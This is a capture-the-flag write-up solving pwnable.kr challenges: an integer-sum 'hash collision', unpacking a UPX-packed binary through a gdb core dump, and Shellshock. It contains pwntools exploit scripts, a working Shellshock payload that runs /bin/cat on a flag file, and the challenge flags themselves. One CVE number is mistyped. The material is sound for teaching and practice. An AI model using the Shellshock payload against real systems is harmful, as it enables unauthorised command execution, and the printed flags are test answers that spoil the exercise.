# Empiricism
 
Writeups of few ezpz challenges from pwnable.kr, super fun.<br />

Files can be downloaded at : http://pwnable.kr/play.php <br />

## Collision

This challenge is about (MD5) hash collision, here is the C code:

```c
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
	int* ip = (int*)p;
	int i;
	int res=0;
	for(i=0; i<5; i++){
		res += ip[i];
	}
	return res;
}

int main(int argc, char* argv[]){
	if(argc<2){
		printf("usage : %s [passcode]\n", argv[0]);
		return 0;
	}
	if(strlen(argv[1]) != 20){
		printf("passcode length should be 20 bytes\n");
		return 0;
	}

	if(hashcode == check_password( argv[1] )){
		system("/bin/cat flag");
		return 0;
	}
	else
		printf("wrong passcode.\n");
	return 0;
}
```

We would like to produce a 20 bytes hash with the following value : 0x21DD09EC <br />

```
0x21DD09EC = 568134124

0x1010101 * 4 = 0x4040404 <=> '\x01'*16 (16/20 bytes)

0x4040404 = 67372036 
 
568134124 - 67372036 = 0x1DD905E8 (4/20 bytes)

0x21DD09EC = 0x4040404 + 0x1DD905E8 

./col "`python -c "print '\x01'*16 + '\xE8\x05\xD9\x1D'"`"
```

Let's craft an exploit with python/pwntools:

```python
from pwn import *

payload = p32(0x1010101)*4 + p32(0x1DD905E8)

conn = ssh(host='pwnable.kr', user='col', password='guest', port=2222)
p = conn.process(executable='./col', argv=['col', payload])
p.interactive()
```

Output from script is:

```
[+] Connecting to pwnable.kr on port 2222: Done
[!] Couldn't check security settings on 'pwnable.kr'
[+] Starting remote process bytearray(b'./col') on pwnable.kr: pid 389795
[*] Switching to interactive mode
daddy! I just managed to create a hash collision :)
[*] Got EOF while reading in interactive
```

```
daddy! I just managed to create a hash collision :)
```

## Bof

## Flag

This is the only challenge (amongst the four) without code, only binary.

```
└─$ file flag
flag: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header
```

```
└─$ strings flag | less
UPX!
[...]
```

UPX is a packer for executables, we could install upx package, then decompress the binary, and finally look at the binary with gdb. <br />

Another solution is to set a catchpoint at a syscall and generate a core file.

```
└─$ strace ./flag

[...]
mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fdc8b0b3000
write(1, "I will malloc() and strcpy the f"..., 52I will malloc() and strcpy the flag there. take it.
) = 52
exit_group(0)                           = ?
```

Let's set a catchpoint at the end of the program (exit_group func) and generate a core file.

```
└─$ gdb ./flag

gef➤ catch syscall exit_group
Catchpoint 1 (syscall 'exit_group' [231])

gef➤ r

gef➤ generate-core-file core-flag
Saved corefile core-flag

gef➤ quit

└─$ strings -n 21 core-flag | less
UPX...? sounds like a delivery service :)
[...]
```

```
UPX...? sounds like a delivery service :)
```

Original idea from : [Walkthrough of flag level in pwnable.kr](https://www.youtube.com/watch?v=l7dPPmVeRDw)


## Shellshock


GNU Bash through 4.3 processes trailing strings after function definitions in the values of environment variables, which allows remote attackers to execute arbitrary code via a crafted environment.

```
shellshock@pwnable:~$ bash --version
GNU bash, version 4.3.48(1)-release (x86_64-pc-linux-gnu)
```

Bash, in this case, is vulnerable to CVE-2014-761, here is the C code:
```c
int main(){
	setresuid(getegid(), getegid(), getegid());
	setresgid(getegid(), getegid(), getegid());
	system("/home/shellshock/bash -c 'echo shock_me'");
	return 0;
}
```

From wikipedia, you can get the correct string format, just got to translate it afterwards

```c
env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
```

```c
env y='() { :;}; /bin/cat /home/shellshock/flag' ./shellshock"
```

Pretty straight forward from here, we can build an exploit in python

```python
from pwn import *

conn = ssh(host='pwnable.kr', user='shellshock', password='guest', port=2222)
sh = conn.shell();

res = sh.recvuntil(b'$')
sh.sendline(b"env x='() { :;}; /bin/cat /home/shellshock/flag' ./shellshock")
res = sh.recvuntil(b'$')

print("\n")
print(res)
print("\n")

sh.close()
conn.close()

```

Output from script is:
```
[+] Connecting to pwnable.kr on port 2222: Done
[!] Couldn't check security settings on 'pwnable.kr'
[+] Opening new channel: 'shell': Done


b" env x='() { :;}; /bin/cat /home/shellshock/flag' ./shellshock\r\nonly if I knew CVE-2014-6271 ten years ago..!!\r\nSegmentation fault (core dumped)\r\nshellshock@pwnable:~$"


[*] Closed SSH channel with pwnable.kr
[*] Closed connection to 'pwnable.kr'
```

```
only if I knew CVE-2014-6271 ten years ago..!!
```

